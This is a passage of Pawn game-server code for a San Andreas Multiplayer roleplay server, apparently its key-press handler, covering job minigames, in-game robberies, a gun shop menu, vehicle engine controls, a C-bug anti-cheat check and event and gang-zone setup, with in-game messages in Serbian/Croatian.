                    DestroyDynamic3DTextLabel(RolexLabel[i]);

                GameTextForPlayer(playerid, "~r~Kradja u toku..", 30000, 3);

                robaRafRolex[playerid] = true;

                defer robRolexTimer(playerid);

                return 1;
            }
        }
    }

    if(radiAstronaut[playerid] && astronautTDShowed[playerid] && astronautCP[playerid] == 4 && astronautPopravkaBroj[playerid] < 15) {

        if(astronautKey[playerid] == 1) { //Y

            if(newkeys == KEY_YES) {

                astronautPopravkaBroj[playerid]++;
                astronautTDShow(playerid, false);
                defer astronautTDTimer(playerid);
                SendJobMessage(playerid, "Nastavi dalje ( %d/15 )", astronautPopravkaBroj[playerid]);
                return 1;
            }
            else if(newkeys == KEY_NO) {

                astronautTDShow(playerid, false);
                defer astronautTDTimer(playerid);
                if(astronautPopravkaBroj[playerid] >= 1)
                    astronautPopravkaBroj[playerid]--;
                SendJobMessage(playerid, "Promasio si slovo ( %d/15 )", astronautPopravkaBroj[playerid]);
                return 1;
            }
        }
        if(astronautKey[playerid] == 2) { //N

            if(newkeys == KEY_YES) {

                astronautTDShow(playerid, false);
                defer astronautTDTimer(playerid);
                if(astronautPopravkaBroj[playerid] >= 1)
                    astronautPopravkaBroj[playerid]--;
                SendJobMessage(playerid, "Promasio si slovo ( %d/15 )", astronautPopravkaBroj[playerid]);
                return 1;
            }
            else if(newkeys == KEY_NO) {

                astronautPopravkaBroj[playerid]++;
                astronautTDShow(playerid, false);
                defer astronautTDTimer(playerid);
                SendJobMessage(playerid, "Nastavi dalje ( %d/15 )", astronautPopravkaBroj[playerid]);
                return 1;
            }
        }
    }

    if(InfoSkate[playerid][sActive] && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT){
        static bool:act;
        SetPlayerArmedWeapon(playerid,0);
        if(newkeys & KEY_HANDBRAKE){
            #if MODE_SKATE == 0
            // medium speed
            ApplyAnimation(playerid, "SKATE","skate_run",4.1,1,1,1,1,1,1);
            #else
            // fast speed
            ApplyAnimation(playerid, "SKATE","skate_sprint",4.1,1,1,1,1,1,1);
            #endif
            if(!act){
                act = true;
                RemovePlayerAttachedObject(playerid,INDEX_SKATE);
                DestroyObject(InfoSkate[playerid][sSkate]);
                InfoSkate[playerid][sSkate] = CreateObject(19878,0,0,0,0,0,0);
                AttachObjectToPlayer(InfoSkate[playerid][sSkate],playerid, -0.2,0,-0.9,0,0,90);
            }
        }
        if(oldkeys & KEY_HANDBRAKE){
            ApplyAnimation(playerid, "CARRY","crry_prtial",4.0,0,0,0,0,0);
            if(act){
                act = false;
                DestroyObject(InfoSkate[playerid][sSkate]);
                RemovePlayerAttachedObject(playerid,INDEX_SKATE);
                #if TYPE_SKATE == 0
                // the skate is placed on the right arm
                SetPlayerAttachedObject(playerid,INDEX_SKATE,19878,6,-0.055999,0.013000,0.000000,-84.099983,0.000000,-106.099998,1.000000,1.000000,1.000000);
                #else
                // the skate is placed in the back
                SetPlayerAttachedObject(playerid,INDEX_SKATE,19878,1,0.055999,-0.173999,-0.007000,-95.999893,-1.600010,24.099992,1.000000,1.000000,1.000000);
                #endif
            }
        }
    }

    if(chooseGun[playerid] != 0) {

        if(PRESSED(KEY_NO)) {

            if(chooseGun[playerid] == 1) return SendErrorMessage(playerid, "Nema dalje nazad!");

            chooseGun[playerid]--;

            buyGunTDShow(playerid, chooseGun[playerid]);

            buyGunShow(playerid, chooseGun[playerid]);

            return 1;
        }

        if(PRESSED(KEY_YES)) {

            if(chooseGun[playerid] == 10) return SendErrorMessage(playerid, "Nema dalje napred!");

            chooseGun[playerid]++;

            buyGunTDShow(playerid, chooseGun[playerid]);

            buyGunShow(playerid, chooseGun[playerid]);

            return 1;
        }

        if(PRESSED(KEY_SPRINT)) {

            giveGunShopGun(playerid, chooseGun[playerid]);

            SendInfoMessage(playerid, "Uspesno si kupio oruzje!");

            buyGunShow(playerid, 0);

            buyGunTDShow(playerid, 0);

            return 1;
        }

        if(PRESSED(KEY_WALK)) {

            SendInfoMessage(playerid, "Odustao si od kupovine oruzija!");

            buyGunShow(playerid, 0);

            buyGunTDShow(playerid, 0);
            
            return 1;
        }
    }

    if(PRESSED(KEY_JUMP) && PlayerInfo[playerid][xParadox] == 1)
    {
        SetPlayerSkin(playerid, GetPlayerSkin(playerid));
        ClearAnimations(playerid);
    }

	if(PRESSED(KEY_JUMP) && !IsPlayerInAnyVehicle(playerid) && RadiSabotazer{playerid})
	{
        if(IsPlayerInRangeOfPoint(playerid, 0.8, -2328.8032,1528.6339,1.5218))
        {
            return IgracSePenje(playerid, -2330.0303,1530.7231,17.3281);
        }
	}

    if(newkeys == KEY_HANDBRAKE) {

        if(GetPlayerSkin(playerid) == skinid && GetPVarInt(playerid,"roped") == 0 && IsPlayerInAnyVehicle(playerid) && GetPlayerVehicleSeat(playerid) != 0 && PoliceDuty[playerid])
        {
            GetPlayerPos(playerid,pl_pos[playerid][0],pl_pos[playerid][1],pl_pos[playerid][2]);
            MapAndreas_FindZ_For2DCoord(pl_pos[playerid][0],pl_pos[playerid][1],pl_pos[playerid][3]);
            pl_pos[playerid][4] = floatsub(pl_pos[playerid][2],pl_pos[playerid][3]);
            if(pl_pos[playerid][4] >= ropelength) return SendClientMessage(playerid,0xAA3333AA,"Visina je prevelika da bi iskocio!");
            if(pl_pos[playerid][4] <= 2) return RemovePlayerFromVehicle(playerid);
            SetPVarInt(playerid,"roped",1);
            SetPlayerCheckpoint(playerid,pl_pos[playerid][0],pl_pos[playerid][1],floatsub(pl_pos[playerid][3],offsetz),20);
            SetPlayerPos(playerid,pl_pos[playerid][0],pl_pos[playerid][1],floatsub(pl_pos[playerid][2],2));
            SetPlayerVelocity(playerid,0,0,0);
            for(new rep=0;rep!=10;rep++) ApplyAnimation(playerid,"ped","abseil",4.0,0,0,0,1,0);
            for(new cre=0;cre<=pl_pos[playerid][4];cre++)
            {
                r0pes[playerid][cre] = CreateDynamicObject(3004, pl_pos[playerid][0],pl_pos[playerid][1],floatadd(pl_pos[playerid][3],cre),87.640026855469,342.13500976563, 350.07507324219, -1, -1, -1, 150.0, 150.0, -1, 0);
                //r0pes[playerid][cre] = CreateObject(3004,pl_pos[playerid][0],pl_pos[playerid][1],floatadd(pl_pos[playerid][3],cre),87.640026855469,342.13500976563, 350.07507324219);
            }
            SetTimerEx("syncanim",dur,0,"i",playerid);

            return 1;
        }
    }

	if(newkeys == KEY_SPRINT)
	{

        if(radiPorno[playerid] && IsValidPlayerProgressBar(playerid, PornoBar[playerid])) {

            pornoProgress[playerid] += 5.0;

            if(pornoProgress[playerid] >= 300.00) {

                radiPorno[playerid] = false;
                pornoProgress[playerid] = 0.0;

                DestroyPlayerProgressBar(playerid, PornoBar[playerid]);
                PornoBar[playerid] = INVALID_PLAYER_BAR_ID;

                if(ServerInfo[HappyJob] == POSAO_PORNO) {
                    dajPlatuIgracu(playerid, PlataPosla[PLATA_PORNO] * 2);
                    SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
                }
                else dajPlatuIgracu(playerid, PlataPosla[PLATA_PORNO]);

                SavePlayer(playerid);

                BussinesJobMoney(POSAO_PORNO, PlataPosla[PLATA_PORNO]/2);

                SendInfoMessage(playerid, "Zavrsio si posao i zaradio %d koji su legli na platni racun!", PlataPosla[PLATA_PORNO]);

                pornoCooldown[playerid] = 60;

                KrevetUpotreba = false;

                TogglePlayerControllable(playerid, 1);
                ClearAnimations(playerid);

                return 1;
            }

            SetPlayerProgressBarValue( playerid, PornoBar[ playerid ], pornoProgress[playerid]);

            return 1;
        }

        if(playerHacking[playerid] >= 2) {

            playerHacking[playerid]++;
            HackingTDControl(playerid, playerHacking[playerid]);

            return 1;
        }

		if(RadiVojnik{playerid} && TrebaDaUstane{playerid})
		{
			ClearAnimations(playerid);
			TogglePlayerControllable(playerid, 1);
			Novi_SetPlayerCheckpoint(playerid, 134.1318,1933.6721,19.2502, 2.0);
			VojnikMisijaJedanCP{playerid} = 4;
			TrebaDaUstane{playerid} = false;
			return 1;
		}
	}

    if( PRESSED( KEY_SUBMISSION ) ) {
        if( IsPlayerInAnyVehicle( playerid ) && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
	        new vehicle = GetPlayerVehicleID( playerid ),
				engine,lights,alarm,doors,bonnet,boot,objective;

            GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
            if(engine == 1) {

                if( IsVehicleBajs( vehicle ) ) return SendErrorMessage( playerid, "Stvarno mislis ugasiti biciklu? " );
                SetVehicleParamsEx(vehicle,0,lights,alarm,doors,bonnet,boot,objective);
                if( Maskuse[ playerid ] == true )
                    format( globalstring, sizeof( globalstring ), "* Maska_%d gasi motor.", PlayerInfo[ playerid ][ xMaskID ] );
                else
                    format( globalstring, sizeof( globalstring ), "* %s gasi motor.", ImeIgraca( playerid ) );
                PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );

                return 1;
            }

		 	if( vCanDrive[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");
		    if( IsVehicleBajs( vehicle ) ) return SendErrorMessage( playerid, "Stvarno mislis upaliti biciklu? " );
			if( Fuel[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Vozilo nema goriva ne mozete ga upaliti." );

			if(PrivatnoVozilo(vehicle)) {
			
				if( PlayerInfo[ playerid ][ xAdmin ] >= 5 ) { }
				else {
			        if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 0 ] ][ vID ] == vehicle ) { }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 1 ] ][ vID ] == vehicle ) { }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 2 ] ][ vID ] == vehicle ) { }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 3 ] ][ vID ] == vehicle ) { }
                    else if( PlayerInfo[ playerid ][ xRezervniKljucevi ] == getVehicleScriptID(vehicle) ) { }
					else return SendErrorMessage( playerid, "Ovo nije vase vozilo." );
				}

	            GetVehicleParamsEx( vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
				if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );
	            if( Maskuse[ playerid ] == true )
	            	format( globalstring, sizeof( globalstring ), "* Maska_%d pokusava pokrenuti motor.", PlayerInfo[ playerid ][ xMaskID ] );
	            else
					format( globalstring, sizeof( globalstring ), "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );
				PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
				SetTimerEx( "VehicleEngineStart", 1000, 0, "i", playerid );
				SetPVarInt( playerid, "StartingVehicle", 1 );
			
			}
			else {
				GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
			    if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );
				if( Maskuse[ playerid ] == true )
	            	format( globalstring, sizeof( globalstring ), "* Maska_%d pokusava pokrenuti motor.", PlayerInfo[ playerid ][ xMaskID ] );
				else
					format( globalstring, sizeof( globalstring ), "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );
				PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
				SetTimerEx( "VehicleEngineStart", 1000, 0, "i", playerid );
				SetPVarInt( playerid, "StartingVehicle", 1 );

		    }
		}
    }

    if( takingselfie[ playerid ] ) {
    
		if( PRESSED( KEY_ANALOG_RIGHT ) ) {
		
			GetPlayerPos(playerid,lX[ playerid ],lY[ playerid ],lZ[ playerid ]);
			static Float: n1X, Float: n1Y;
		    if(Degree[ playerid ] >= 360) Degree[ playerid ] = 0;
		    Degree[ playerid ] += SelfieSpeed;
		    n1X = lX[ playerid ] + SelfieRadius * floatcos(Degree[ playerid ], degrees);
		    n1Y = lY[ playerid ] + SelfieRadius * floatsin(Degree[ playerid ], degrees);
		    SetPlayerCameraPos(playerid, n1X, n1Y, lZ[ playerid ] + SelfieHeight);
		    SetPlayerCameraLookAt(playerid, lX[ playerid ], lY[ playerid ], lZ[ playerid ]+1);
		    SetPlayerFacingAngle(playerid, Degree[ playerid ] - 90.0);
		}
		if( PRESSED( KEY_ANALOG_LEFT ) ) {
		
		    GetPlayerPos(playerid,lX[ playerid ],lY[ playerid ],lZ[ playerid ]);
			static Float: n1X, Float: n1Y;
		    if(Degree[ playerid ] >= 360) Degree[ playerid ] = 0;
		    Degree[ playerid ] -= SelfieSpeed;
		    n1X = lX[ playerid ] + SelfieRadius * floatcos(Degree[ playerid ], degrees);
		    n1Y = lY[ playerid ] + SelfieRadius * floatsin(Degree[ playerid ], degrees);
		    SetPlayerCameraPos(playerid, n1X, n1Y, lZ[ playerid ] + SelfieHeight);
		    SetPlayerCameraLookAt(playerid, lX[ playerid ], lY[ playerid ], lZ[ playerid ]+1);
		    SetPlayerFacingAngle(playerid, Degree[ playerid ] - 90.0);
		}
	}



    if( HOLDING( KEY_FIRE ) ) {
        new autoid = GetPVarInt( playerid, "ResprayvID" );
        new igrac = GetPVarInt( playerid, "ResprayDozvola" );
        if( igrac != -1 && GetPVarInt( playerid, "RespraySpray" ) == 1 && ResprayColor1[ playerid ] != -1 && ResprayColor2[ playerid ] != -1 && GetWeapon( playerid ) == 41 && IsPlayerNearPlayer( 10.0, playerid, igrac ) && IsPlayerInAnyVehicle( igrac ) )
        {
            if( IsPlayerInRangeOfPoint( playerid, 15.0, 1978.9244, -1585.0405, 13.3126 ) && IsPlayerInRangeOfPoint( igrac, 15.0, 1978.9244, -1585.0405, 13.3126 ) && PlayerInfo[ playerid ][ xMDelovi ] >= 5  && strcmp( ImeIgraca( igrac ), VehicleInfo[ autoid ][ vOwner ], true) == 0 && IsPlayerFacingVehicle( playerid, GetPlayerVehicleID( igrac ) ) )
			{
            	FarbanjeTimer[ playerid ] = SetTimerEx( "ResprayTimer", 3000, 0, "ii", igrac, autoid );
			}
        }
    }

    if( newkeys == KEY_SECONDARY_ATTACK ) {
        if( GetPlayerState( playerid ) == 1 ) UlazIzlaz( playerid );

        if( GetPlayerSpecialAction( playerid ) != SPECIAL_ACTION_NONE && GetPlayerSpecialAction( playerid ) != SPECIAL_ACTION_CUFFED  ) {
            SetPlayerSpecialAction( playerid, SPECIAL_ACTION_NONE );
        }
	}

    if( !IsPlayerInAnyVehicle( playerid ) && IsCbugWeapon( playerid ) && ( ( tickcount( ) - antiCheatCS[ playerid ][ LastWShot ] ) < 750 ) ) {
		if( HOLDING( KEY_JUMP | KEY_SPRINT | KEY_CROUCH ) ) {
		
			// new Float:Zivot;
			// GetPlayerHealth( playerid, Zivot );
			// Novi_SetPlayerHealth( playerid, Zivot-30 );

            if(WARPInfo[ playerid ][ warID ] != -1) return 1;
            if(NaDmEventu[playerid]) return 1;

			GameTextForPlayer( playerid, "~r~Prestani da radis C-Bug!", 1000, 3 );

            TogglePlayerControllable( playerid, 0 );

            defer cBugTimer(playerid);

			antiCheatCS[ playerid ][ LastWShot ] = -1;

			return 1;
		}
		if( newkeys & KEY_CROUCH ) {
		
			SetTimerEx( "__check", 200, false, "i", playerid );
		}
	}

	if( ( newkeys==KEY_SECONDARY_ATTACK ) && GetPVarInt( playerid, "gSmoking") > 0 )
    {
        if(GetPVarInt( playerid, "gSmoking") == 1)
        {
	        SetPlayerSpecialAction( playerid,0 );
	        SetPVarInt( playerid, "gSmoking", 0 );
		  	format( globalstring, sizeof( globalstring ), "** %s baca cigaretu na pod.", ImeIgraca( playerid ) );
		  	PorukaRadius( 15.0, playerid, globalstring, LJUBICASTA );
		}
		else if(GetPVarInt( playerid, "gSmoking") == 2)
		{
            SetPlayerSpecialAction( playerid,0 );
	        SetPVarInt( playerid, "gSmoking", 0 );
		  	format( globalstring, sizeof( globalstring ), "** %s baca joint na pod.", ImeIgraca( playerid ) );
		  	PorukaRadius( 15.0, playerid, globalstring, LJUBICASTA );
		}

    }

    else if(newkeys == KEY_NO)
	{

        if(PokupiTorbu[playerid]) {

            if(!IsPlayerInRangeOfPoint(playerid, 5.0, 1001.4782,1890.0865,1202.2400)) return SendErrorMessage(playerid, "Nisi kod novca!");
            PokupiTorbu[playerid] = false;

            UnistiNovac();

            RemovePlayerAttachedObject(playerid, OBJECT_SLOT_BADGE);
            SetPlayerAttachedObject( playerid, OBJECT_SLOT_BADGE, 1550, 1, -0.008714, -0.188819, -0.026564, 159.138153, 86.558647, 0.000000, 1.005565, 0.984468, 1.014210 );

            PostaviBusilicu[playerid] = false;
            BusilicaTime[playerid] = 0;
            BankaUToku = false;
            BankaOrobana = true;
            RobaBanku[playerid] = false;
            PokupiTorbu[playerid] = false;
            PostaviBusilicu[playerid] = false;

            defer SledeciRobBanke();

            new org = PlayerInfo[playerid][xClan];

            SetPlayerCheckpoint(playerid, OI[org][oPozExtX], OI[org][oPozExtY], OI[org][oPozExtZ], 5.0);

            NosiBankaTorbu[playerid] = true;

            SendInfoMessage(playerid, "Uspesno si opljackao banku! Odnesi torbu u svoju organizaciju!");

            return 1;
        }

        if(PostaviBusilicu[playerid]) {

            if(!IsPlayerInRangeOfPoint(playerid, 3.0, 1007.8017,1881.2753,1202.2400)) return SendErrorMessage(playerid, "Nisi ispred sefa!");

            // PlayerInfo[playerid][xBusilica] = 0;
            PostaviBusilicu[playerid] = false;
            BusilicaTime[playerid] = BankaRobTime;

            KreirajBusilicu();

            TimerRobBanka = defer BusilicaTimer(playerid);
            return 1;
        }

        if(radiVojnik2[playerid] && vojnik2CP[playerid] == 9) {

            DestroyPlayerObject(playerid, vojnik2Obj[playerid]);

            VojnikMessage(playerid, "Uspesno si pokupio dokumenta!");
            VojnikMessage(playerid, "General : Primili smo ometanje signala u tvojoj blizini! Saljem lokaciju!");

            vojnik2CP[playerid] = 10;

            TogglePlayerControllable(playerid, 0);

            InterpolateCameraPos(playerid, -404.640960, 2200.207031, 44.780101, -635.211853, 2250.872802, 145.987411, 8000);
            InterpolateCameraLookAt(playerid, -406.890502, 2204.665527, 44.530204, -636.067199, 2255.797119, 145.846801, 8000);

            defer vojnik2CameraToranj(playerid);

            return 1;
        }

        if(radiMisiju[playerid] == 3 && misijaKradja[playerid] == 5) {

            if(!IsPlayerInRangeOfPoint(playerid, 2.0, 1495.6776,-1696.4559,8.2542)) return SendErrorMessage(playerid, "Nisi kod stola sa laptopom!");

            misijaKradja[playerid] = 6;

            DestroyPlayerObject(playerid, misijaLaptop[playerid]);

            Novi_SetPlayerCheckpoint(playerid, misijePosX, misijePosY, misijePosZ, 3.0);

            SendInfoMessage(playerid, "Odnesi laptop sefu!");

            return 1;
        }

        if(NosiKutijuMats[playerid]) {

            new Float:X, Float:Y, Float:Z;
            new veh = KombiMats;
            getPosBehindVehicle(veh, X, Y, Z, 0.0);
            if(!IsPlayerInRangeOfPoint(playerid, 4.0, X+4.0, Y, Z)) return SendErrorMessage(playerid, "Nisi iza kombija!");

            if(KombiMatsPaketi >= 3) return SendErrorMessage(playerid, "Kombi ima maksimalan broj paketa!");

            switch(NosiBrojMats[playerid]) {

                case 0: {

                    DestroyObject(KutijaAttach[0]);
                }
                case 1: {

                    DestroyObject(KutijaAttach[1]);
                }
                case 2: {

                    DestroyObject(KutijaAttach[2]);
                }
            }

            NosiBrojMats[playerid] = -1;

            KombiMatsPaketi++;
            NosiKutijuMats[playerid] = false;



            SendInfoMessage(playerid, "Uspesno si ubacio paket! Trenutno paketa u kombiju %d/3", KombiMatsPaketi);

            return 1;
        }

        if(PostaviBusilicuZlatara[playerid]) {

            if(!IsPlayerInRangeOfPoint(playerid, 3.0, 1107.1649,-1675.4945,13.5349)) return SendErrorMessage(playerid, "Nisi ispred sefa!");
            PostaviBusilicuZlatara[playerid] = false;
            BusilicaTimeZlatara[playerid] = ZlataraRobTime;

            KreirajBusilicuZlatara();

            TimerRobZlatara = defer BusilicaTimerZlatara(playerid);
            return 1;
        }
        if(PokupiTorbuZlatara[playerid]) {

            if(!IsPlayerInRangeOfPoint(playerid, 3.0, 1113.5916,-1671.8805,13.5349)) return SendErrorMessage(playerid, "Nisi ispred stola!");
            PokupiTorbuZlatara[playerid] = false;

            SetPlayerAttachedObject( playerid, 0, 1550, 1, -0.008714, -0.188819, -0.026564, 159.138153, 86.558647, 0.000000, 1.005565, 0.984468, 1.014210 );

            PostaviBusilicuZlatara[playerid] = false;
            BusilicaTimeZlatara[playerid] = 0;
            ZlataraRobUToku = false;
            ZlataraOrobana = true;
            RobaZlataru[playerid] = false;
            PokupiTorbuZlatara[playerid] = false;
            PostaviBusilicuZlatara[playerid] = false;

            defer SledeciRobZlatare();

            new org = PlayerInfo[playerid][xClan];

            Novi_SetPlayerCheckpoint(playerid, OI[org][oPozExtX], OI[org][oPozExtY], OI[org][oPozExtZ], 5.0);

            NosiZlataraTorbu[playerid] = true;

            SendInfoMessage(playerid, "Uspesno si opljackao zlataru! Odnesi torbu u svoju organizaciju!");
            SendClientMessageToAll(0xFF0000FF, "(ZLATARA ROB) "col_white"Obavestavamo gradjane da se dogodila pljacka zlatare!");

            return 1;
        }
		if(UbacujeTelo[playerid] == 1)
		{
			if(!IsPlayerInRangeOfPoint(playerid, 2.0, 27.3873,-279.9469,2.3138)) return SendErrorMessage(playerid, "Nisi blizu tela!"); //BOLNICARI
			ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1 );
			SetPlayerAttachedObject( playerid, OBJECT_NOSI, 3092, 1, 0.10, 0.46, -0.01, 0.0, 89.0, 85.0, 1.04, 1.00, 1.00 );
			SendInfoMessage(playerid, "Ubaci telo iza kamiona koristeci tipku N!");
			UbacujeTelo[playerid]++;
		}
		if(UbacujeTelo[playerid] == 2)
		{
			new Float:X, Float:Y, Float:Z;
			new veh = BolnicarVozilo[playerid];
			getPosBehindVehicle(veh, X, Y, Z, 0.0);
			if(!IsPlayerInRangeOfPoint(playerid, 2.0, X, Y, Z)) return SendErrorMessage(playerid, "Nisi iza ambulantnih kola!");
			ClearAnimations(playerid);
			RemovePlayerAttachedObject( playerid, OBJECT_NOSI );
			SendInfoMessage(playerid, "Vrati se u vozilo i odvezi telo nazad u bolnicu!");
			UbacujeTelo[playerid]++;	
		}
		if(HungerGame{playerid} == true)
		{
			if(KutijaTimer{playerid} > 0) return SendClientMessage(playerid, -1, "[HungerGames]Moras cekati 10 sekundi pre otvaranja druge kutije!");
			for(new KutijaID=0;KutijaID<sizeof(kutijeObject);KutijaID++)
			{
				new Float:X, Float:Y, Float:Z;
				GetObjectPos(kutijeObject[KutijaID], X, Y, Z);
				if(IsPlayerInRangeOfPoint(playerid, 2.0, X, Y, Z))
				{
					new Oruzije[32];
		            new RandomOruzije = RandomNew(17, 33)+1;
		            new RandomMunicija = RandomNew(5, 15);
		            if(GetPlayerWeapon(playerid) == RandomOruzije) { ResetPlayerWeapons(playerid); }
		            GiveWeaponToPlayer(playerid, RandomOruzije, RandomMunicija);
		            GetWeaponName(RandomOruzije,Oruzije,sizeof(Oruzije));
		            va_SendClientMessage(playerid, -1, "[HungerGames]Izvukao si %s iz kutije!", Oruzije);
					KutijaTimercic = defer KutijaOdbrojavanje(playerid);
					KutijaTimer{playerid} = 10;
				}
			}
		}
	}

    else if( ( newkeys == KEY_SECONDARY_ATTACK ) && InAmbu[ playerid ] != -1 && IsPlayerInRangeOfPoint( playerid, 1.5, 2003.2792, 2283.7454, 1011.1256 ) )
	{
		new Float:vehPos[ 3 ];
		getPosBehindVehicle( InAmbu[ playerid ], vehPos[0], vehPos[1], vehPos[2], 0.0 );
		Novi_SetPlayerPos( playerid, vehPos[0], vehPos[1], vehPos[2] );
		SetPlayerInterior( playerid, 0 );
		InAmbu[ playerid ] = -1;
	}
    else if( PRESSED( KEY_FIRE ) ) {
        if( PlayerCreateEvent[ playerid ] ) {

			if( EventCP[ playerid ] == 1 ) {
				new dFile[ 32 ], Float:Pos[ 4 ];
				GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
				GetPlayerFacingAngle( playerid, Pos[ 3 ] );
				format( dFile, 35, EVENT_FILE, EventID[ playerid ] );
                if( EventCarsCreate[ playerid ] == 1 ) {
					new
						INI:File = INI_Open( dFile );

			        INI_WriteString( File, "Name", EventName[ playerid ] );
			    	INI_WriteFloat( File, "TCPX", Pos[ 0 ] );
			    	INI_WriteFloat( File, "TCPY", Pos[ 1 ] );
			    	INI_WriteFloat( File, "TCPZ", Pos[ 2 ] );
			    	INI_WriteFloat( File, "TCPA", Pos[ 3 ] );
			    	INI_WriteInt( File, "Veh", EventVehID[ playerid ] );
			    	INI_Close( File );
		     		format( Event[ EventID[ playerid ] ][ Name ], 64, "%s", EventName[ playerid ] );
					Event[ EventID[ playerid ] ][ TCPX ] = Pos[ 0 ];
					Event[ EventID[ playerid ] ][ TCPY ] = Pos[ 1 ];
					Event[ EventID[ playerid ] ][ TCPZ ] = Pos[ 2 ];
					Event[ EventID[ playerid ] ][ TCPA ] = Pos[ 3 ];
					Event[ EventID[ playerid ] ][ VehID ] = EventVehID[ playerid ];
					SCM( playerid, ZUTA, "Postavio si red za vozila 1." );
					EventCarsCreate[ playerid ]++;
				}
				else if( EventCarsCreate[ playerid ] == 2 ) {
                    new
						INI:File = INI_Open( dFile );

			    	INI_WriteFloat( File, "TCPX2", Pos[ 0 ] );
			    	INI_WriteFloat( File, "TCPY2", Pos[ 1 ] );
			    	INI_WriteFloat( File, "TCPZ2", Pos[ 2 ] );
			    	INI_WriteFloat( File, "TCPA2", Pos[ 3 ] );
			    	INI_Close( File );
					EventCP[ playerid ]++;
					EventCarsCreate[ playerid ] = 0;
					Event[ EventID[ playerid ] ][ TCPX2 ] = Pos[ 0 ];
					Event[ EventID[ playerid ] ][ TCPY2 ] = Pos[ 1 ];
					Event[ EventID[ playerid ] ][ TCPZ2 ] = Pos[ 2 ];
					Event[ EventID[ playerid ] ][ TCPA2 ] = Pos[ 3 ];
					SCM( playerid, ZUTA, "Postavio si red za vozila 2." );
					SCM( playerid, ZUTA, "Koristi LMB(levi klik misa) za postavljanje checkpointa. Kada zavrsis ukucaj /ezavrsi.");
				}
			}
			else if( EventCP[ playerid ] > 1 ) {
				new dFile[ 32 ], Float:Pos[ 3 ], string[ 6 ];
				GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
				format( dFile, 35, EVENT_FILE, EventID[ playerid ] );

				new
					INI:File = INI_Open( dFile );

		        format( string, 6, "CPX%d", EventCP[ playerid ] );
		    	INI_WriteFloat( File, string, Pos[ 0 ] );
				CheckPoint[ EventID[ playerid ] ][ EventCP[ playerid ] ][ CPX ] = Pos[ 0 ];

		    	format( string, 6, "CPY%d", EventCP[ playerid ] );
		    	INI_WriteFloat( File, string, Pos[ 1 ] );
		    	CheckPoint[ EventID[ playerid ] ][ EventCP[ playerid ] ][ CPY ] = Pos[ 1 ];

		    	format( string, 6, "CPZ%d",EventCP[ playerid ] );
		    	INI_WriteFloat( File, string, Pos[ 2 ] );
				CheckPoint[ EventID[ playerid ] ][ EventCP[ playerid ] ][ CPZ ] = Pos[ 2 ];

		    	INI_Close( File );
		    	SendClientMessageEx( playerid, ZUTA, "Postavio si Checkpoint %d.", EventCP[ playerid ]-1 );
		    	EventCP[ playerid ]++;
			}
		}


        if( CreatingGZone[ playerid ] == 1 ) {
        
		    new Float:Pos[ 3 ];
			GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

			if( IsCordsInOtherGZone( Pos[ 0 ], Pos[ 1 ] ) != -1 ) return SendErrorMessage( playerid, "Ne mozes da postavis u drugoj gang zoni." );

	        CreatingPos[ playerid ][ 0 ] = Pos[ 0 ];
	        CreatingPos[ playerid ][ 1 ] = Pos[ 1 ];
            SendInfoMessage( playerid, "Koristi "col_white"LMB"col_crvena" da postavis pozicije." );
	        SendInfoMessage( playerid, "Sada sacuvaj poziciju desnog gornjeg ugla polja." );
	        CreatingGZone[ playerid ]++;
        }
        else if( CreatingGZone[ playerid ] == 2 ) {
        
            new Float:Pos[ 4 ];
            new id = CreatingGZoneID[ playerid ];

			if( id == -1 ) return SendErrorMessage( playerid, "Vec ima maksimalni broj gang zona." );

			GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
			GetPlayerFacingAngle( playerid, Pos[ 3 ] );

			if( IsCordsInOtherGZone( Pos[ 0 ], Pos[ 1 ] ) != -1 ) return SendErrorMessage( playerid, "Ne mozes da postavis u drugoj gang zoni." );

	        CreatingPos[ playerid ][ 2 ] = Pos[ 0 ];
	        CreatingPos[ playerid ][ 3 ] = Pos[ 1 ];
	        CreatingGZone[ playerid ]++;

            GZone_Reset( id );

            if( CreatingPos[ playerid ][ 0 ] > CreatingPos[ playerid ][ 2 ] ) {
			    gZoneInfo[ id ][ gZoneMaxX ] = CreatingPos[ playerid ][ 0 ];
				gZoneInfo[ id ][ gZoneMinX ] = CreatingPos[ playerid ][ 2 ];
			}
			else if( CreatingPos[ playerid ][ 2 ] > CreatingPos[ playerid ][ 0 ] ) {
			    gZoneInfo[ id ][ gZoneMaxX ] = CreatingPos[ playerid ][ 2 ];
				gZoneInfo[ id ][ gZoneMinX ] = CreatingPos[ playerid ][ 0 ];
			}

			if( CreatingPos[ playerid ][ 1 ] > CreatingPos[ playerid ][ 3 ] ) {
			    gZoneInfo[ id ][ gZoneMaxY ] = CreatingPos[ playerid ][ 1 ];
				gZoneInfo[ id ][ gZoneMinY ] = CreatingPos[ playerid ][ 3 ];
